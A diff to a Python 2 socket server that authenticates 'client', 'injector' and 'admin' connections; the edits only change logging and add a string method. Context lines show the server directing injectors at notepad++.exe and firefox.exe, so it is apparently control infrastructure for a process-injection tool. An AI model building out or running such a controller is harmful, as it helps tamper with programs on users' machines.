@@ -66,7 +66,7 @@ class Server(object):
         while True:
             client_socket, client_addr = self.server_socket.accept()
             client = ClientHandler(client_socket, self.client_messages, self, client_addr)
-            print client
+
             self.client_list.append(client)
             client.daemon = True
             client.start()
@@ -92,6 +92,7 @@ class ClientHandler(threading.Thread):
 
     def __init__(self, client_socket, client_messages, server, client_addr):
         super(ClientHandler, self).__init__()
+
         self.client_socket = client_socket
         self.client_messages = client_messages
         self.server = server
@@ -102,6 +103,7 @@ class ClientHandler(threading.Thread):
         self.client_info = {}
         self.client_type = self.client_types["unknown"]
         self.__kill = threading.Event()
+        print "New client connected: {address}".format(address=self.addr)
 
     def run(self):
         while True:
@@ -137,7 +139,6 @@ class ClientHandler(threading.Thread):
             return
 
         if not self.is_auth() and message.strip() in [CLIENT_HELLO, INJECTOR_HELLO, ADMIN_HELLO]:
-            print "HERREE"
             self.client_socket.send(SERVER_HELLO)
             self.authenticated = self.auth_statuses["auth_ok"]
             if message.strip() == CLIENT_HELLO:
@@ -170,7 +171,7 @@ class ClientHandler(threading.Thread):
                         self.client_info[key] = value
             self.authenticated = self.auth_statuses["auth_complete"]
             self.send(PROTOCOL_STATUS_CODES["ok"])
-            print "New client[{type}] authenticated: {uid}".format(uid=self.uid, type=self.client_type)
+            print "{client_info} has authenticated".format(client_info=self)
             return
         return
 
@@ -195,6 +196,14 @@ class ClientHandler(threading.Thread):
             self.send("{\"inject_to\":[\"notepad++.exe\", \"firefox.exe\"]}")
         elif self.client_type == self.client_types["admin"]:
             pass
+
+    def __str__(self):
+        if self.is_auth():
+            return "{type} [Address: {address} | UID: {uid}]".format(address=self.addr, uid=self.uid,
+                                       type=self.client_types.keys()[
+                                           self.client_types.values().index(self.client_type)])
+        else:
+            return "Client {address} is not authenticated".format(address=self.addr)
 
 class MessageHandler(threading.Thread):
     def __init__(self, client_messages, server):
